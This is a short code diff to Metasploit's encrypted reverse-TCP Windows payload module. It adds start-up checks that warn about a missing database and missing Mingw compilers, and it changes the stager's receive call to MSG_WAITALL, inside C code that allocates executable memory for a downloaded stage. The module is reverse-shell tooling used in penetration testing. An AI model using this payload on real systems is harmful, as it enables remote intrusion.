@@ -20,6 +20,27 @@ module Payload::Windows::EncryptedReverseTcp
 
   def initialize(*args)
     super
+
+    # prevents checks running when module is initialized during msfconsole startup
+    if framework
+      unless framework.db.connection_established?
+        add_warning('A database connection is preferred for this module. If this is not possible, please make sure to '\
+        'take note of the ChachaKey & ChachaNonce options used during generation in order to set them correctly when '\
+        'calling a module handler.')
+      end
+
+      if self.arch.nil? || self.arch.empty?
+        add_warning('Payload architecture could not be determined.')
+        return
+      end
+
+      if self.arch.include?('x86') && !::Metasploit::Framework::Compiler::Mingw::X86.available?
+        add_error("x86 Mingw installation is not available.")
+      end
+      if self.arch.include?('x64') && !::Metasploit::Framework::Compiler::Mingw::X64.available?
+        add_error("x64 Mingw installation is not available.")
+      end
+    end
   end
 
   def generate(opts={})
@@ -545,7 +566,7 @@ module Payload::Windows::EncryptedReverseTcp
         FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll', 'VirtualAlloc') -> 0xe553a458
         register char *received = VirtualAlloc(NULL, stage_size + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-        int recv_stg = RecvData(conn_socket, received, stage_size, 0);
+        int recv_stg = RecvData(conn_socket, received, stage_size, MSG_WAITALL);
         if(recv_stg != stage_size)
         {
           ExitProcess(proc_term_status);
